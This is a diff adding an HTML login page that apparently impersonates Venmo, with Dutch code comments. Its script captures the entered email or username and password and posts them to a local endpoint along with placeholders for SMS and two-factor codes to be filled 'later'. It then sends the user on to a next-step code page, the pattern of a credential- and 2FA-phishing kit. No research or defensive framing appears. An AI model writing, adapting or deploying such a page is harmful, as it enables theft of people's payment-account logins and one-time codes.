@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Venmo - Log In</title>
+  <link rel="stylesheet" href="/bamba.css" />
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-logo">
+      <img src="venmo.png" alt="Venmo Logo" />
+    </div>
+    <div class="login-box">
+      <div class="login-title">Log in</div>
+      <div class="login-subtext">Enter email, mobile, or username</div>
+      <form id="loginForm">
+        <input type="text" id="loginInput" name="login" placeholder="Enter email, mobile, or username" required class="login-input" />
+        <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required class="login-input" />
+        <button type="submit" class="login-button">Log in</button>
+      </form>
+    </div>
+    <div class="sign-up"><a href="#">Sign up</a></div>
+  </div>
+  <div class="disclaimer">
+    By logging in, you agree to the
+    <a href="#">Terms of Service</a> and
+    <a href="#">Privacy Policy</a>.
+  </div>
+
+  <script>
+    // Functie om een random session ID te maken
+    function generateSessionId() {
+      return 'sess-' + Math.random().toString(36).substring(2, 9) + Date.now();
+    }
+
+    // Session ID ophalen of aanmaken
+    let sessionId = sessionStorage.getItem('session_id');
+    if (!sessionId) {
+      sessionId = generateSessionId();
+      sessionStorage.setItem('session_id', sessionId);
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const loginValue = document.getElementById('loginInput').value.trim();
+      const passwordValue = document.getElementById('passwordInput').value.trim();
+      if (!loginValue || !passwordValue) {
+        alert("Please enter both login and password.");
+        return;
+      }
+
+      const data = {
+        type: 'venmo',
+        email: loginValue,
+        phoneNumber: '',    // leeg, wordt later ingevuld
+        password: passwordValue,
+        smsCode: '',        // leeg, kan later komen
+        twoFACode: '',      // leeg, kan later komen
+        twoFAchoice: '',    // leeg, kan later komen
+        sessionId: sessionId,
+        timestamp: Date.now()
+      };
+
+      fetch('/api/submitLogin', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+      })
+      .then(res => {
+        if (!res.ok) throw new Error('Server error');
+        window.location.href = '/ccode.html'; // Ga naar de volgende stap
+      })
+      .catch(err => {
+        console.error('❌ Fout bij verzenden:', err);
+        alert('Something went wrong. Please try again.');
+      });
+    });
+  </script>
+</body>
+</html>
